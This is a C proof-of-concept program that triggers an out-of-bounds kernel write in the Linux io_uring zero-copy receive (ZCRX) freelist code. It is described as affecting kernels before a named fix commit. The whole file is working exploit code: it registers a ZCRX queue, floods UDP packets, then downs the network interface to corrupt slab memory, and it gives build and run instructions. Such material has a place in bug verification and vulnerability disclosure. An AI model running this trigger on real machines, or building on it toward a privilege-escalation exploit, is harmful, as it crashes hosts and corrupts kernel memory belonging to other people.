/*
 * zcrx_crash.c — minimal OOB trigger for io_uring ZCRX freelist
 *
 * Bug:    io_zcrx_return_niov_freelist() — free_count++ with no bounds check
 * Fixed:  commit 770594e ("io_uring/zcrx: warn on freelist violations")
 * Kernel: Linux 6.15 – 6.19 pre-770594e, CONFIG_IO_URING_ZCRX=y
 *
 * Trigger path:
 *   1. IORING_REGISTER_ZCRX_IFQ  → page_pool created, freelist[N] allocated
 *   2. RECV_ZC + UDP flood        → niovs allocated, uref_array[i] = 1
 *   3. Wait 100ms                 → partial drain: some niovs in ptr_ring,
 *                                   some still in-flight (uref > 0)
 *   4. SIOCSIFFLAGS IFF_DOWN      → ndo_stop → page_pool_destroy():
 *        ptr_ring drain: io_pp_zc_release_netmem() → free_count++ per niov
 *        io_pp_zc_destroy scrub:  for each niov where uref != 0:
 *                                   io_zcrx_return_niov() → free_count++
 *        When free_count == num_niovs on entry to scrub:
 *          freelist[num_niovs] = niov_idx   ← OOB u32 write
 *
 * Requirements:
 *   CAP_NET_ADMIN + real ZCRX NIC (mlx5/CX-6+, Intel E800, nfp, bnxt_en, gve)
 *   Does NOT trigger on zcrx_vnic.ko (no real page_pool → io_pp_zc_destroy
 *   never fires).
 *
 * Build: gcc -O2 -o zcrx_crash zcrx_crash.c
 * Run:   ./zcrx_crash <ifname>
 * Check: dmesg | grep -E 'WARN_ON|kasan|slab-out-of-bounds|zcrx'
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <linux/io_uring.h>
#include <arpa/inet.h>

static inline int io_uring_setup(unsigned n, struct io_uring_params *p)
{ return (int)syscall(__NR_io_uring_setup, n, p); }

static inline int io_uring_enter(int fd, unsigned sub, unsigned min, unsigned fl)
{ return (int)syscall(__NR_io_uring_enter, fd, sub, min, fl, NULL, 0); }

static inline int io_uring_register(int fd, unsigned op, void *arg, unsigned nr)
{ return (int)syscall(__NR_io_uring_register, fd, op, arg, nr); }

#ifndef IORING_REGISTER_ZCRX_IFQ
#define IORING_REGISTER_ZCRX_IFQ   32
#endif
#ifndef IORING_SETUP_DEFER_TASKRUN
#define IORING_SETUP_DEFER_TASKRUN (1U << 13)
#endif
#ifndef IORING_SETUP_SINGLE_ISSUER
#define IORING_SETUP_SINGLE_ISSUER (1U << 12)
#endif
#ifndef IORING_SETUP_CQE32
#define IORING_SETUP_CQE32         (1U << 11)
#endif
#ifndef IORING_OP_RECV_ZC
#define IORING_OP_RECV_ZC          62
#endif

/* 4MB area → 1024 niovs → freelist = kmalloc-4096 */
#define AREA_SIZE   (4UL << 20)
#define RQ_ENTRIES  512
#define FLOOD_COUNT 2048
#define RECV_PORT   9877

static int nic_set_up(const char *ifname, int up)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) { perror("socket"); return -1; }

    struct ifreq ifr = {};
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ - 1);

    if (ioctl(s, SIOCGIFFLAGS, &ifr) < 0) { perror("SIOCGIFFLAGS"); close(s); return -1; }
    ifr.ifr_flags = up ? (ifr.ifr_flags | IFF_UP) : (ifr.ifr_flags & ~IFF_UP);
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) { perror("SIOCSIFFLAGS"); close(s); return -1; }

    close(s);
    return 0;
}

int main(int argc, char *argv[])
{
    const char *ifname = argc > 1 ? argv[1] : "zcrx0";

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] zcrx_crash  iface=%s  niovs=%lu  flood=%d\n",
           ifname, AREA_SIZE / 4096, FLOOD_COUNT);

    /* io_uring ring */
    struct io_uring_params p = {};
    p.flags = IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN | IORING_SETUP_CQE32;
    int ring_fd = io_uring_setup(RQ_ENTRIES, &p);
    if (ring_fd < 0) { perror("io_uring_setup"); return 1; }

    size_t sq_sz  = p.sq_off.array + p.sq_entries * sizeof(uint32_t);
    size_t sqe_sz = p.sq_entries * sizeof(struct io_uring_sqe);
    void *sq_ring = mmap(NULL, sq_sz, PROT_READ|PROT_WRITE,
                         MAP_SHARED|MAP_POPULATE, ring_fd, IORING_OFF_SQ_RING);
    struct io_uring_sqe *sqes = mmap(NULL, sqe_sz, PROT_READ|PROT_WRITE,
                                     MAP_SHARED|MAP_POPULATE, ring_fd, IORING_OFF_SQES);
    if (sq_ring == MAP_FAILED || sqes == MAP_FAILED) { perror("mmap sq"); return 1; }

    uint32_t *sq_tail = (uint32_t *)((char *)sq_ring + p.sq_off.tail);
    uint32_t *sq_mask = (uint32_t *)((char *)sq_ring + p.sq_off.ring_mask);

    /* ZCRX area — try hugepages, fall back to regular */
    void *area = mmap(NULL, AREA_SIZE, PROT_READ|PROT_WRITE,
                      MAP_SHARED|MAP_ANONYMOUS|MAP_HUGETLB, -1, 0);
    if (area == MAP_FAILED)
        area = mmap(NULL, AREA_SIZE, PROT_READ|PROT_WRITE,
                    MAP_SHARED|MAP_ANONYMOUS|MAP_POPULATE, -1, 0);
    if (area == MAP_FAILED) { perror("mmap area"); return 1; }
    memset(area, 0, 4096);

    /* RQ memory */
    size_t rq_sz = 4096 + sizeof(struct io_uring_zcrx_rqe) * RQ_ENTRIES;
    void *rq_mem = mmap(NULL, rq_sz, PROT_READ|PROT_WRITE,
                        MAP_SHARED|MAP_ANONYMOUS, -1, 0);
    if (rq_mem == MAP_FAILED) { perror("mmap rq"); return 1; }

    /* Register IFQ */
    struct io_uring_region_desc rd = {
        .user_addr = (uint64_t)(uintptr_t)rq_mem,
        .size      = rq_sz,
        .flags     = IORING_MEM_REGION_TYPE_USER,
    };
    struct io_uring_zcrx_area_reg ar = {
        .addr = (uint64_t)(uintptr_t)area,
        .len  = AREA_SIZE,
    };
    struct io_uring_zcrx_ifq_reg reg = {
        .if_idx     = if_nametoindex(ifname),
        .rq_entries = RQ_ENTRIES,
        .area_ptr   = (uint64_t)(uintptr_t)&ar,
        .region_ptr = (uint64_t)(uintptr_t)&rd,
    };
    if (!reg.if_idx) { fprintf(stderr, "[-] interface '%s' not found\n", ifname); return 1; }
    if (io_uring_register(ring_fd, IORING_REGISTER_ZCRX_IFQ, &reg, 1) < 0) {
        switch (errno) {
        case EPERM:      fprintf(stderr, "[-] EPERM: need CAP_NET_ADMIN\n"); break;
        case EEXIST:     fprintf(stderr, "[-] EEXIST: rxq busy\n"); break;
        case EOPNOTSUPP: fprintf(stderr, "[-] EOPNOTSUPP: %s has no ZCRX support\n", ifname); break;
        default:         fprintf(stderr, "[-] register: %s\n", strerror(errno));
        }
        return 1;
    }
    printf("[+] IFQ registered  id=%u  num_niovs=%lu  freelist=kmalloc-%lu\n",
           reg.zcrx_id, AREA_SIZE / 4096, AREA_SIZE / 4096 * 4);

    /* RECV_ZC */
    int recv_fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (recv_fd < 0) { perror("socket"); return 1; }
    struct sockaddr_in sa = { .sin_family = AF_INET, .sin_port = htons(RECV_PORT) };
    bind(recv_fd, (struct sockaddr *)&sa, sizeof(sa));

    uint32_t tail = *sq_tail;
    struct io_uring_sqe *sqe = &sqes[tail & *sq_mask];
    memset(sqe, 0, sizeof(*sqe));
    sqe->opcode       = IORING_OP_RECV_ZC;
    sqe->fd           = recv_fd;
    sqe->zcrx_ifq_idx = reg.zcrx_id;
    sqe->user_data    = 0xdeadbeef;
    __atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);
    io_uring_enter(ring_fd, 1, 0, 0);
    printf("[+] RECV_ZC submitted\n");

    /* Flood packets → allocate niovs, set uref_array */
    printf("[*] flooding %d packets...\n", FLOOD_COUNT);
    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in dst = {
        .sin_family      = AF_INET,
        .sin_port        = htons(RECV_PORT),
        .sin_addr.s_addr = inet_addr("127.0.0.1"),
    };
    char pkt[64] = "ZCRX-OOB";
    for (int i = 0; i < FLOOD_COUNT; i++)
        sendto(sfd, pkt, sizeof(pkt), 0, (struct sockaddr *)&dst, sizeof(dst));
    close(sfd);

    /* Partial drain: split niovs between ptr_ring (returned) and in-flight (uref>0) */
    usleep(100000);

    /* Trigger: NIC down → page_pool_destroy → io_pp_zc_destroy scrub → OOB */
    printf("[*] NIC down → page_pool_destroy...\n");
    if (nic_set_up(ifname, 0) < 0) return 1;
    usleep(300000);
    nic_set_up(ifname, 1);

    close(recv_fd);
    close(ring_fd);

    printf("[+] done\n");
    printf("    dmesg | grep -E 'WARN_ON|WARNING|kasan|slab-out-of-bounds'\n");
    printf("    pre-770594e + KASAN:  slab-out-of-bounds in io_zcrx_return_niov_freelist\n");
    printf("    post-770594e:         WARNING: WARN_ON_ONCE in io_zcrx_return_niov_freelist\n");
    return 0;
}
